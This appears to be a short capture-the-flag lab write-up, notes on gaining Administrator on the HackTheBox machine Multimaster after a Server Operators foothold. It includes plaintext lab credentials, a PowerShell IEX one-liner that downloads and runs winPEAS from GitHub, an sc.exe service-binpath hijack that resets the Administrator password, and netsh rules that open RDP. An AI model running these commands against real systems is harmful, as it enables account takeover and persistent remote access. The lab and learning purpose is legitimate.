
Still no Root flag means we have to escalate our access now.
```
evil-winrm -u 'jorden' -p 'rainforest786' -i 10.10.10.179    
```

![[Pasted image 20241002184740.png]]


![[Pasted image 20241002185019.png]]


![[Pasted image 20241002185539.png]]

So what really stand out here is that it is a member of server operators.

Let's see how to run winpeas or privs check

SO we have to run powershell winpeas and it works (i.e. i wasted my time trying to run x86 and 64 and any)
```
powershell "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"
```

As we can see that we have access to sc
![[Pasted image 20241008072610.png]]

So i reset the box simply as instead of getting a reverse shell why don't we directly change the password aka administrator simply
```
sc.exe config browser binpath="C:\Windows\System32\cmd.exe /C net user Administrator HolaA123!!"
```

```
sc.exe qc browser
```

```
sc.exe stop browser
```

```
sc.exe start browser
```


```
evil-winrm -i multimaster.htb -u Administrator -p 'HolaA123!!'
```

Now we simply have to copy the root.txt but we can also get the RDP

```
netsh advfirewall firewall add rule name="RDP" protocol=TCP dir=in localport=3389 action=allow
```

```
netsh advfirewall firewall add rule name="RDP" protocol=TCP dir=out localport=3389 action=allow
```

Root.txt
```
0058fcf18700544a2e17712f784fa6a9
```

![[Pasted image 20241012003036.png]]

